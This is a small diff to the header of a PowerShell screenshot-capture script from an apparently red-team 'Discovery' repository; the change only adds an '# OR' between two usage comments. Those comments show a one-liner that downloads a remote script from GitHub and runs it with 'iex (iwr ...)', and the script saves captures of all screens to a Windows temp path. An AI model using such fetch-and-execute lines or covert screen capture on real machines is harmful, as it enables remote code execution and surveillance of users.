@@ -1,5 +1,6 @@
 # Usage:
 # iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);
+# OR
 # powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);"
 # Default path: C:\Windows\Temp\test.png
 $screens = [Windows.Forms.Screen]::AllScreens
